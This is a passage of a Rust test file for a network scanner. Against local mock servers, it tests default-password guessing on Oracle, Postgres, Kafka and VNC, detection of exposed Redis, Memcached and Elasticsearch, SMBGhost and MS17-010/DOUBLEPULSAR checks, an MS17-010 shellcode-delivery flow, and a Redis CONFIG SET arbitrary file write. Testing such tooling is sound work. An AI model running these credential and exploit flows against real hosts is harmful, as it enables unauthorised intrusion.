    .expect("oracle finding should exist");

    assert_eq!(finding.plugin, "oracle");
    assert_eq!(finding.status, "weak-password");
    assert_eq!(finding.details["service"], json!("oracle"));
    assert_eq!(finding.details["username"], json!("ADMIN"));
    assert_eq!(finding.details["password"], json!("admin@123"));
    assert_eq!(finding.details["service_name"], json!("ORCL"));
    assert!(attempts.contains(&(
        "ADMIN".to_string(),
        "admin@123".to_string(),
        "ORCL".to_string(),
    )));
}

#[test]
fn tries_oracle_high_risk_credentials_first() {
    let mut attempts = Vec::new();
    let finding = scan_oracle_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 1521,
        },
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, password, service_name, _| {
            attempts.push((
                username.to_string(),
                password.to_string(),
                service_name.to_string(),
            ));
            Ok(username == "SYS" && password == "123456" && service_name == "XE")
        },
    )
    .expect("scan should succeed")
    .expect("oracle finding should exist");

    assert_eq!(
        attempts.first(),
        Some(&("SYS".to_string(), "123456".to_string(), "XE".to_string()))
    );
    assert_eq!(finding.details["username"], json!("SYS"));
    assert_eq!(finding.details["password"], json!("123456"));
    assert_eq!(finding.details["service_name"], json!("XE"));
}

#[test]
fn detects_postgres_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let startup = postgres_read_startup(&mut stream).expect("startup should read");
        let text = String::from_utf8_lossy(&startup);
        assert!(text.contains("user\0postgres\0"));
        stream
            .write_all(&postgres_server_message(
                b'R',
                &[5u32.to_be_bytes().as_slice(), &[1, 2, 3, 4]].concat(),
            ))
            .expect("auth should write");

        let (tag, payload) = postgres_read_message(&mut stream).expect("password should read");
        assert_eq!(tag, b'p');
        let password = String::from_utf8_lossy(&payload);
        assert!(password.starts_with("md5"));

        stream
            .write_all(&postgres_server_message(b'R', &0u32.to_be_bytes()))
            .expect("auth ok should write");
        stream
            .write_all(&postgres_server_message(b'Z', b"I"))
            .expect("ready should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "postgres",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "postgres");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["service"], json!("postgresql"));
    assert_eq!(findings[0].details["username"], json!("postgres"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_kafka_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let request = kafka_read_frame(&mut stream).expect("request should read");
        assert_eq!(kafka_request_api_key(&request), Some(18));
        stream
            .write_all(&kafka_response_frame(1, &[0, 0, 0, 0]))
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "kafka",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "kafka");
    assert_eq!(findings[0].status, "unauthorized-access");
}

#[test]
fn detects_kafka_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut unauth_stream, _) = listener.accept().expect("unauth request should arrive");
        let request = kafka_read_frame(&mut unauth_stream).expect("request should read");
        assert_eq!(kafka_request_api_key(&request), Some(18));

        let (mut auth_stream, _) = listener.accept().expect("auth request should arrive");
        let handshake = kafka_read_frame(&mut auth_stream).expect("handshake should read");
        assert_eq!(kafka_request_api_key(&handshake), Some(17));
        auth_stream
            .write_all(&kafka_response_frame(
                1,
                &[
                    0i16.to_be_bytes().as_slice(),
                    &1i32.to_be_bytes(),
                    &kafka_string("PLAIN"),
                ]
                .concat(),
            ))
            .expect("handshake response should write");

        let auth = kafka_read_frame(&mut auth_stream).expect("auth should read");
        assert!(auth.windows(7).any(|window| window == b"\0admin\0"));
        assert!(auth.windows(6).any(|window| window == b"123456"));

        let request = kafka_read_frame(&mut auth_stream).expect("api versions should read");
        assert_eq!(kafka_request_api_key(&request), Some(18));
        auth_stream
            .write_all(&kafka_response_frame(2, &[0, 0, 0, 0]))
            .expect("api versions response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "kafka",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "kafka");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_vnc_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let challenge = *b"0123456789abcdef";
        stream
            .write_all(b"RFB 003.008\n")
            .expect("version should write");
        let mut version = [0u8; 12];
        stream
            .read_exact(&mut version)
            .expect("version should read");
        stream.write_all(&[1, 2]).expect("security should write");

        let mut selected = [0u8; 1];
        stream
            .read_exact(&mut selected)
            .expect("selection should read");
        assert_eq!(selected[0], 2);

        stream
            .write_all(&challenge)
            .expect("challenge should write");
        let mut response = [0u8; 16];
        stream
            .read_exact(&mut response)
            .expect("response should read");
        assert_eq!(
            response,
            vnc_encrypt_challenge("123456", &challenge).expect("challenge should encrypt")
        );
        stream
            .write_all(&0u32.to_be_bytes())
            .expect("status should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "vnc",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "vnc");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_smbghost_vulnerability() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 256];
        let count = stream.read(&mut buffer).expect("probe should read");
        assert_eq!(&buffer[..count], SMBGHOST_PROBE);

        let mut response = vec![0u8; 96];
        response[16..22].copy_from_slice(b"Public");
        response[72..74].copy_from_slice(&[0x11, 0x03]);
        response[74..76].copy_from_slice(&[0x02, 0x00]);
        stream.write_all(&response).expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "smbghost",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "smbghost");
    assert_eq!(findings[0].status, "vulnerable");
    assert_eq!(findings[0].details["type"], json!("cve-2020-0796"));
}

#[test]
fn detects_ms17010_vulnerability() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");

        let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
        stream
            .read_exact(&mut negotiate)
            .expect("negotiate should read");
        assert_eq!(negotiate, ms17010_negotiate_request());
        stream
            .write_all(&ms17010_negotiate_response())
            .expect("negotiate response should write");

        let mut session = vec![0u8; ms17010_session_setup_request().len()];
        stream
            .read_exact(&mut session)
            .expect("session should read");
        assert_eq!(session, ms17010_session_setup_request());
        let user_id = [0x34, 0x12];
        stream
            .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
            .expect("session response should write");

        let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
        stream.read_exact(&mut tree).expect("tree should read");
        assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
        let tree_id = [0x78, 0x56];
        stream
            .write_all(&ms17010_tree_response(tree_id))
            .expect("tree response should write");

        let mut pipe = vec![0u8; ms17010_trans_named_pipe_request().len()];
        stream
            .read_exact(&mut pipe)
            .expect("named pipe should read");
        assert_eq!(pipe, ms17010_trans_named_pipe_request_for(tree_id, user_id));
        stream
            .write_all(&ms17010_named_pipe_response(true))
            .expect("named pipe response should write");

        let mut trans2 = vec![0u8; ms17010_trans2_session_setup_request().len()];
        stream.read_exact(&mut trans2).expect("trans2 should read");
        assert_eq!(
            trans2,
            ms17010_trans2_session_setup_request_for(tree_id, user_id)
        );
        stream
            .write_all(&ms17010_backdoor_response(true))
            .expect("backdoor response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ms17010",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ms17010");
    assert_eq!(findings[0].status, "vulnerable");
    assert_eq!(findings[0].details["vulnerability"], json!("MS17-010"));
    assert_eq!(findings[0].details["backdoor"], json!("DOUBLEPULSAR"));
    assert_eq!(findings[0].details["os"], json!("Windows Server 2012 R2"));
}

#[test]
fn resolves_ms17010_bind_shellcode_preset() {
    let shellcode = resolve_ms17010_shellcode("bind").expect("bind preset should resolve");
    assert!(shellcode.len() > 10);
}

#[test]
fn rejects_ms17010_cs_preset_as_invalid_shellcode() {
    let error = resolve_ms17010_shellcode("cs").expect_err("cs preset should be invalid");
    assert!(error.to_string().contains("invalid ms17010 shellcode"));
}

#[test]
fn attempts_ms17010_exploit_when_shellcode_requested() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    let payload_capture = Arc::new(Mutex::new(Vec::new()));
    let capture = Arc::clone(&payload_capture);

    let server = thread::spawn(move || {
        let (mut detect_stream, _) = listener.accept().expect("detect connection should arrive");

        let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
        detect_stream
            .read_exact(&mut negotiate)
            .expect("negotiate should read");
        assert_eq!(negotiate, ms17010_negotiate_request());
        detect_stream
            .write_all(&ms17010_negotiate_response())
            .expect("negotiate response should write");

        let mut session = vec![0u8; ms17010_session_setup_request().len()];
        detect_stream
            .read_exact(&mut session)
            .expect("session should read");
        assert_eq!(session, ms17010_session_setup_request());
        let user_id = [0x34, 0x12];
        detect_stream
            .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
            .expect("session response should write");

        let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
        detect_stream
            .read_exact(&mut tree)
            .expect("tree should read");
        assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
        let tree_id = [0x78, 0x56];
        detect_stream
            .write_all(&ms17010_tree_response(tree_id))
            .expect("tree response should write");

        let mut pipe = vec![0u8; ms17010_trans_named_pipe_request().len()];
        detect_stream
            .read_exact(&mut pipe)
            .expect("named pipe should read");
        assert_eq!(pipe, ms17010_trans_named_pipe_request_for(tree_id, user_id));
        detect_stream
            .write_all(&ms17010_named_pipe_response(true))
            .expect("named pipe response should write");

        let mut trans2 = vec![0u8; ms17010_trans2_session_setup_request().len()];
        detect_stream
            .read_exact(&mut trans2)
            .expect("trans2 should read");
        assert_eq!(
            trans2,
            ms17010_trans2_session_setup_request_for(tree_id, user_id)
        );
        detect_stream
            .write_all(&ms17010_backdoor_response(true))
            .expect("backdoor response should write");
        drop(detect_stream);

        let (mut exploit_stream, _) = listener.accept().expect("exploit connection should arrive");
        let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
        exploit_stream
            .read_exact(&mut negotiate)
            .expect("exploit negotiate should read");
        assert_eq!(negotiate, ms17010_negotiate_request());
        exploit_stream
            .write_all(&ms17010_negotiate_response())
            .expect("exploit negotiate response should write");

        let mut session = vec![0u8; ms17010_session_setup_request().len()];
        exploit_stream
            .read_exact(&mut session)
            .expect("exploit session should read");
        assert_eq!(session, ms17010_session_setup_request());
        exploit_stream
            .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
            .expect("exploit session response should write");

        let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
        exploit_stream
            .read_exact(&mut tree)
            .expect("exploit tree should read");
        assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
        exploit_stream
            .write_all(&ms17010_tree_response(tree_id))
            .expect("exploit tree response should write");

        let nt_trans = read_netbios_message(&mut exploit_stream).expect("nt trans should read");
        assert_eq!(nt_trans[8], 0xA0);
        exploit_stream
            .write_all(&ms17010_framed_response(0xA0, tree_id, user_id, &[]))
            .expect("nt trans response should write");

        for index in 0..15 {
            let trans =
                read_netbios_message(&mut exploit_stream).expect("trans2 packet should read");
            assert_eq!(trans[8], 0x33);
            if index == 0 {
                assert_eq!(
                    trans.len(),
                    smb1_trans2_exploit_packet(tree_id, user_id, 0, "zero").len()
                );
            }
        }
        let echo = read_netbios_message(&mut exploit_stream).expect("echo should read");
        assert_eq!(echo[8], 0x2B);
        exploit_stream
            .write_all(&ms17010_framed_response(0x2B, tree_id, user_id, &[]))
            .expect("echo response should write");

        let (mut free_hole_start, _) = listener.accept().expect("free hole start should arrive");
        let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
        free_hole_start
            .read_exact(&mut negotiate)
            .expect("free hole start negotiate should read");
        free_hole_start
            .write_all(&ms17010_negotiate_response())
            .expect("free hole start negotiate response should write");
        let free_hole_start_packet =
            read_netbios_message(&mut free_hole_start).expect("free hole start packet should read");
        assert_eq!(free_hole_start_packet[8], 0x73);
        free_hole_start
            .write_all(&ms17010_framed_response(
                0x73,
                [0x00, 0x00],
                [0x00, 0x00],
                &[],
            ))
            .expect("free hole start response should write");

        let mut groom_streams = Vec::new();
        for _ in 0..MS17010_EXPLOIT_INITIAL_GROOMS {
            let (mut groom, _) = listener.accept().expect("groom should arrive");
            let mut header = vec![0u8; MS17010_SMB2_GROOM_HEADER.len()];
            groom
                .read_exact(&mut header)
                .expect("groom header should read");
            assert_eq!(header, MS17010_SMB2_GROOM_HEADER);
            groom_streams.push(groom);
        }

        let (mut free_hole_end, _) = listener.accept().expect("free hole end should arrive");
        let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
        free_hole_end
            .read_exact(&mut negotiate)
            .expect("free hole end negotiate should read");
        free_hole_end
            .write_all(&ms17010_negotiate_response())
            .expect("free hole end negotiate response should write");
        let free_hole_end_packet =
            read_netbios_message(&mut free_hole_end).expect("free hole end packet should read");
        assert_eq!(free_hole_end_packet[8], 0x73);
        free_hole_end
            .write_all(&ms17010_framed_response(
                0x73,
                [0x00, 0x00],
                [0x00, 0x00],
                &[],
            ))
            .expect("free hole end response should write");

        for _ in 0..MS17010_EXPLOIT_SECOND_GROOMS {
            let (mut groom, _) = listener.accept().expect("second groom should arrive");
            let mut header = vec![0u8; MS17010_SMB2_GROOM_HEADER.len()];
            groom
                .read_exact(&mut header)
                .expect("second groom header should read");
            assert_eq!(header, MS17010_SMB2_GROOM_HEADER);
            groom_streams.push(groom);
        }

        let final_packet =
            read_netbios_message(&mut exploit_stream).expect("final packet should read");
        assert_eq!(final_packet[8], 0x33);
        exploit_stream
            .write_all(&ms17010_framed_response(0x33, tree_id, user_id, &[]))
            .expect("final response should write");

        for (index, mut groom) in groom_streams.into_iter().enumerate() {
            let mut first = vec![0u8; MS17010_EXPLOIT_BODY_FIRST_CHUNK];
            groom
                .read_exact(&mut first)
                .expect("first groom payload should read");
            let mut second =
                vec![0u8; MS17010_EXPLOIT_BODY_SECOND_END - MS17010_EXPLOIT_BODY_FIRST_CHUNK];
            groom
                .read_exact(&mut second)
                .expect("second groom payload should read");
            if index == 0 {
                let mut captured = first;
                captured.extend_from_slice(&second);
                *capture.lock().expect("capture should lock") = captured;
            }
        }
    });

    let runtime = ServiceRuntimeBundle {
        ms17010: Ms17010RuntimeOptions {
            shellcode: Some("41414141414141414141".to_string()),
        },
        ..ServiceRuntimeBundle::default()
    };
    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ms17010",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &runtime,
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].details["exploit"], json!("payload-sent"));
    let captured = payload_capture.lock().expect("capture should lock").clone();
    assert!(!captured.is_empty());
    assert!(captured.windows(10).any(|window| window == b"AAAAAAAAAA"));
}

#[test]
fn detects_findnet_identification() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut probe = vec![0u8; FINDNET_PROBE_ONE.len()];
        stream
            .read_exact(&mut probe)
            .expect("probe one should read");
        assert_eq!(probe, FINDNET_PROBE_ONE);
        stream
            .write_all(b"ok")
            .expect("probe one response should write");

        let mut probe = vec![0u8; FINDNET_PROBE_TWO.len()];
        stream
            .read_exact(&mut probe)
            .expect("probe two should read");
        assert_eq!(probe, FINDNET_PROBE_TWO);
        let mut response = vec![0u8; 42];
        response.extend(findnet_test_payload("DESKTOP01", &["10.0.0.5", "fe80::1"]));
        stream
            .write_all(&response)
            .expect("probe two response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "findnet",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "findnet");
    assert_eq!(findings[0].status, "identified");
    assert_eq!(findings[0].details["hostname"], json!("DESKTOP01"));
}

#[test]
fn detects_netbios_identification() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    let udp = match UdpSocket::bind("127.0.0.1:137") {
        Ok(udp) => udp,
        Err(error) if error.kind() == ErrorKind::PermissionDenied => return,
        Err(error) => panic!("udp should bind: {error}"),
    };

    let udp_server = thread::spawn(move || {
        let mut request = [0u8; 128];
        let (size, peer) = udp
            .recv_from(&mut request)
            .expect("udp request should arrive");
        assert_eq!(&request[..size], NETBIOS_UDP_PROBE);
        udp.send_to(&netbios_udp_response("WORKGROUP", "DESKTOP01"), peer)
            .expect("udp response should send");
    });

    let tcp_server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("tcp request should arrive");
        let mut session = [0u8; 128];
        let _ = stream.read(&mut session).expect("session should read");
        stream.write_all(b"\x82").expect("session ack should write");

        let mut negotiate = [0u8; 512];
        let _ = stream
            .read(&mut negotiate)
            .expect("negotiate one should read");
        stream
            .write_all(b"ok")
            .expect("negotiate one ack should write");
        let _ = stream
            .read(&mut negotiate)
            .expect("negotiate two should read");
        stream
            .write_all(&netbios_ntlm_response())
            .expect("ntlm response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "netbios",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    udp_server.join().expect("udp server should finish");
    tcp_server.join().expect("tcp server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "netbios");
    assert_eq!(findings[0].status, "identified");
    assert_eq!(findings[0].details["domain_name"], json!("WORKGROUP"));
    assert_eq!(findings[0].details["computer_name"], json!("DESKTOP01"));
}

#[test]
fn detects_memcached_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 1024];
        let _ = stream.read(&mut buffer);
        stream
            .write_all(b"STAT pid 1\r\nEND\r\n")
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "memcached",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "memcached");
    assert_eq!(findings[0].status, "unauthorized-access");
}

#[test]
fn detects_redis_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 1024];
        let _ = stream.read(&mut buffer);
        stream
            .write_all(b"$12\r\nredis_version\r\n")
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "redis",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "redis");
    assert_eq!(findings[0].status, "unauthorized");
}

#[test]
fn executes_redis_custom_file_write() {
    let runtime = ServiceRuntimeBundle {
        redis: RedisRuntimeOptions {
            redis_write_path: Some("/tmp/pwned.txt".to_string()),
            redis_write_content: Some("hello\nworld".to_string()),
            ..RedisRuntimeOptions::default()
        },
        ..ServiceRuntimeBundle::default()
    };

    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut detect_stream, _) = listener.accept().expect("detect request should arrive");
        assert_eq!(
            redis_read_command(&mut detect_stream).expect("info should read"),
            "INFO\r\n"
        );
        detect_stream
            .write_all(b"$12\r\nredis_version\r\n")
            .expect("response should write");

        let (mut exploit_stream, _) = listener.accept().expect("exploit request should arrive");
        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("dbfilename should read"),
            "CONFIG GET dbfilename\r\n"
        );
        exploit_stream
            .write_all(b"*2\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n")
            .expect("dbfilename should write");

        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("dir should read"),
            "CONFIG GET dir\r\n"
        );
        exploit_stream
            .write_all(b"*2\r\n$3\r\ndir\r\n$4\r\n/tmp\r\n")
            .expect("dir should write");

        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("set dir should read"),
            "CONFIG SET dir /tmp\r\n"
        );
        exploit_stream
            .write_all(b"+OK\r\n")
            .expect("ok should write");

        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("set file should read"),
            "CONFIG SET dbfilename pwned.txt\r\n"
        );
        exploit_stream
            .write_all(b"+OK\r\n")
            .expect("ok should write");

        let write_command = redis_read_command(&mut exploit_stream).expect("set should read");
        assert!(write_command.contains("set x \"hello\\nworld\""));
        exploit_stream
            .write_all(b"+OK\r\n")
            .expect("ok should write");

        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("save should read"),
            "save\r\n"
        );
        exploit_stream
            .write_all(b"+OK\r\n")
            .expect("ok should write");

        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("restore file should read"),
            "CONFIG SET dbfilename dump.rdb\r\n"
        );
        exploit_stream
            .write_all(b"+OK\r\n")
            .expect("ok should write");

        assert_eq!(
            redis_read_command(&mut exploit_stream).expect("restore dir should read"),
            "CONFIG SET dir /tmp\r\n"
        );
        exploit_stream
            .write_all(b"+OK\r\n")
            .expect("ok should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "redis",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &runtime,
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "redis");
    assert_eq!(findings[0].status, "unauthorized");
}

#[test]
fn detects_elasticsearch_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 2048];
        let _ = stream.read(&mut buffer);
        let body = "[{\"health\":\"green\"}]";
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            body
        );
        stream
            .write_all(response.as_bytes())
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "elasticsearch",
        &PluginContext {
            usernames: vec!["elastic".to_string()],
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "elasticsearch");
    assert_eq!(findings[0].status, "unauthorized");
}

#[test]
fn retries_connect_stream_until_success() {
    use std::io::ErrorKind;
    use std::sync::{
        Arc,
        atomic::{AtomicUsize, Ordering},
    };

    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let socket = listener.local_addr().expect("addr");
    let attempts = Arc::new(AtomicUsize::new(0));

    let server = thread::spawn(move || {
        let _ = listener.accept();
    });

    set_connection_runtime_options(ConnectionRuntimeOptions { max_retries: 2 });
    let attempts_for_connect = Arc::clone(&attempts);
    let stream = connect_stream_with(
        &socket,
        Duration::from_secs(1),
        &socket.to_string(),
        move |socket, timeout| {
            let attempt = attempts_for_connect.fetch_add(1, Ordering::SeqCst);
            if attempt < 2 {
                Err(std::io::Error::new(ErrorKind::ConnectionRefused, "retry"))
            } else {
                TcpStream::connect_timeout(socket, timeout)
            }
        },
    )
    .expect("connect stream should retry");
    drop(stream);
    set_connection_runtime_options(ConnectionRuntimeOptions::default());

    assert_eq!(attempts.load(Ordering::SeqCst), 3);
    server.join().expect("server should finish");
}

#[test]
fn executes_service_tasks_with_module_parallelism() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    let tasks = (0..4)
        .map(|port| ServiceScanTask {
            plugin_key: "ftp",
            target: OpenService {
                host: "127.0.0.1".to_string(),
                port,
            },
        })
        .collect::<Vec<_>>();
    let inflight = Arc::new(AtomicUsize::new(0));
    let max_inflight = Arc::new(AtomicUsize::new(0));

    let findings = execute_service_scan_tasks(
        tasks,
        &ServiceRuntimeBundle {
            service: ServiceScanRuntimeOptions {
                module_threads: 2,
                global_timeout_secs: 2,
                log_errors: false,
            },
            ..ServiceRuntimeBundle::default()
        },
        {
            let inflight = Arc::clone(&inflight);
            let max_inflight = Arc::clone(&max_inflight);
            move |task, _runtime| {
                let now = inflight.fetch_add(1, Ordering::SeqCst) + 1;
                max_inflight.fetch_max(now, Ordering::SeqCst);
                thread::sleep(Duration::from_millis(100));
                inflight.fetch_sub(1, Ordering::SeqCst);
                Ok(Some(PluginFinding {
                    plugin: task.plugin_key.to_string(),
                    target: task.target.clone(),
                    status: "identified".to_string(),
                    details: BTreeMap::new(),
                }))
            }
        },
    )
    .expect("task execution should succeed");

    assert_eq!(findings.len(), 4);
    assert!(max_inflight.load(Ordering::SeqCst) >= 2);
}

#[test]
fn stops_scheduling_service_tasks_after_global_timeout() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    let tasks = (0..3)
        .map(|port| ServiceScanTask {
            plugin_key: "ftp",
            target: OpenService {
                host: "127.0.0.1".to_string(),
                port,
            },
        })
        .collect::<Vec<_>>();
    let executed = Arc::new(AtomicUsize::new(0));

    let findings = execute_service_scan_tasks(
        tasks,
        &ServiceRuntimeBundle {
            service: ServiceScanRuntimeOptions {
                module_threads: 1,
                global_timeout_secs: 1,
                log_errors: false,
            },
            ..ServiceRuntimeBundle::default()
        },
        {
            let executed = Arc::clone(&executed);
            move |task, _runtime| {
                executed.fetch_add(1, Ordering::SeqCst);
                thread::sleep(Duration::from_millis(1_100));
                Ok(Some(PluginFinding {
                    plugin: task.plugin_key.to_string(),
                    target: task.target.clone(),
                    status: "identified".to_string(),
                    details: BTreeMap::new(),
                }))
            }
        },
    )
    .expect("task execution should succeed");

